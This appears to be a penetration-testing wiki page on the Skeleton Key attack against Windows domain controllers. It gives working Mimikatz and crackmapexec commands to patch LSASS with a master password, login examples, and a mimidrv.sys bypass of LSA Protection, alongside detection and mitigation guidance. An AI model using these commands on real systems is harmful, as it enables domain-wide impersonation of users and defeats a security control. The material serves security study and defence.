# Skeleton Key Attack

## Description

The Skeleton Key attack is malware that can be injected into the LSASS process on a Domain Controller and creates a master password that will hijack **\[sic]** any authentication request on the domain and allow an attacker to log in as any user on any system on the domain with the same password.

## Prerequisites

* Attacker must have obtained Domain Admin rights
* Mimikatz running on a Domain Controller
* For most effective use all Domain Controllers will need to be exploited however, this is not a hard requirement
* Rebooting a Domain Controller will remove the malware

## Exploitation

After Mimikatz has been dropped onto a Domain Controller and executed with Domain Admin privileges the following simple command can be used to perform the exploit.

```bash
privilege::debug #Check for '20' OK debug rights.
misc::skeleton
```

![](<../../../.gitbook/assets/image (1987).png>)

With the above confirming the Lsass.exe process being successfully patched the password **mimikatz** can be used to authenticate as any user in the domain.

### Usage Examples

### RDP

RDP can be used to authenticate against the Skeleton Key to access high level accounts from a GUI. Below we can access the CEO's desktop directly.

```bash
xfreerdp /v:<IP> /u:<User> /p:<mimikatz> /d:<Domain> #Syntax
xfreerdp /v:10.10.10.9 /u:CEO /p:mimikatz /d:security.local
```

### Mapping Remote Shares

```bash
net use <DriveLetter:> \\<IP>\<Share> /user:<User> mimikatz #Syntax
net use Z: \\10.10.10.9\ADMIN$ /user:Administrator mimikatz
```

### Crackmapexec

With valid Domain Admin credentials `crackmapexec` can be used to inject the `Mimikatz` module and Skeleton key command directly to a target Domain Controller.

```bash
crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'Password123!' -M mimikatz -o COMMAND='misc::skeleton'
```

## Detection

### Enable audit mode for Lsass.exe (Single System)

Edit the registry to the following:

* HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe.
* Set the value of the registry key to AuditLevel=dword:00000008.
* Restart the system

### Enable audit mode for Lsass.exe (Group Policy)

1. Expand **Computer Configuration**, expand **Preferences**, and then expand **Windows Settings**.
2. Right-click **Registry**, point to **New**, and then click **Registry Item**. The **New Registry Properties** dialog box appears.
3. In the **Hive** list, click **HKEY\_LOCAL\_MACHINE.**
4. In the **Key Path** list, browse to **SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe**.
5. In the **Value name** box, type **AuditLevel**.
6. In the **Value type** box, click to select the **REG\_DWORD**.
7. In the **Value data** box, type **00000008**.
8. Click **OK**.

{% hint style="info" %}
For the GPO to take effect, the GPO change must be replicated to all domain controllers.
{% endhint %}

After making required changes the event logs on appropriate systems can be monitored for plug-ins and drivers loaded by lsass.exe

Analyze the results of Event 3033 and Event 3063.

After this, you may see these events in Event Viewer: Microsoft-Windows-Codeintegrity/Operational:

* **Event 3033**: This event records that a code integrity check determined that a process (usually lsass.exe) attempted to load a driver that did not meet the Microsoft signing level requirements.
* **Event 3063**: This event records that a code integrity check determined that a process (usually lsass.exe) attempted to load a driver that did not meet the security requirements for Shared Sections.

## Mitigation

### LSA Protection

LSASS can be run in protected mode which may help to prevent this kind of attack. Enabling protected mode ensures any alterations to the LSASS process must be signed by a verified Microsoft signature. A caveat to this is if malware is able to load into the kernel the protection would be nullified.

Perform the follow registry changes to enable LSA protection:

* HKLM\SYSTEM\CurrentControlSet\Control\Lsa.
* Set the value of the registry key to: "RunAsPPL"=dword:00000001.
* Restart the computer.

{% hint style="danger" %}
LSA plug-ins which are **NOT** compatible with LSA Protection Mode **will NOT function** after enabling the mode.
{% endhint %}

To check if LSA Protection is enabled we can check for Event ID 12 from Wininit under the System logs in Event Viewer.

![](<../../../.gitbook/assets/image (1991).png>)

### Multi-factor authentication

Skeleton key attacks use single authentication on the network for the post exploitation stage. Multi-factor implementations such as a smart card authentication can help to mitigate this attack.

### Application Whitelisting

Application whitelisting can be utilized to stop unapproved applications being executed on the Domain Controller. [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)\*\* \*\*would be an appropriate solution in this circumstance.

### Protecting Domain Administrator accounts

Ensuring Domain admin accounts are not compromised would mitigate this attack as Domain Admin privileges are a hard requirement to perform a skeleton key attack

## Protection Bypass

The below image represents an attempt to access the lsass.exe process and extract clear text passwords and run a skeleton key attack. As we can see this has not been successful since applying the registry key change mentioned in the mitigation section for LSA Protection.

![](<../../../.gitbook/assets/image (1989).png>)

We can check if the LSA Protection RunAsPPL key exists by querying the registry to confirm the LSA protection is in place.

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "RunAsPPL"
# Value 0x1 means LSA Protection is enabled
```

This can be bypassed however by utilizing the mimidrv.sys driver file which is included as a separate file with mimikatz.

{% hint style="info" %}
The mimidrv.sys driver file needs to exists in the same directory as mimikatz.exe.
{% endhint %}

The driver can be loaded by running the command `!+` in `Mimikatz`. After doing so the follow command can be execute to protect the `mimikatz.exe` process.

```bash
!processProtect /process:mimikatz.exe
```

The same command with the `/remove` flag can be used to strip the process protection from a process such as `lsass.exe`

```bash
!processprotect /process:lsass.exe /remove
```

After doing so it is possible to bypass the LSA protection as shown below where the command `misc::skeleton` is performed and successfully completes.

![](<../../../.gitbook/assets/image (1990).png>)

## References:

* \*\* \*\*[https://riccardoancarani.github.io/2020-08-08-hunting-for-skeleton-keys/](https://riccardoancarani.github.io/2020-08-08-hunting-for-skeleton-keys/)
* [https://ldapwiki.com/wiki/LSA%20Protection](https://ldapwiki.com/wiki/LSA%20Protection)
* [https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
* [https://itm4n.github.io/lsass-runasppl/](https://itm4n.github.io/lsass-runasppl/)
* [https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5](https://gorkemkaradeniz.medium.com/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5)
* [https://posts.specterops.io/mimidrv-in-depth-4d273d19e148](https://posts.specterops.io/mimidrv-in-depth-4d273d19e148)
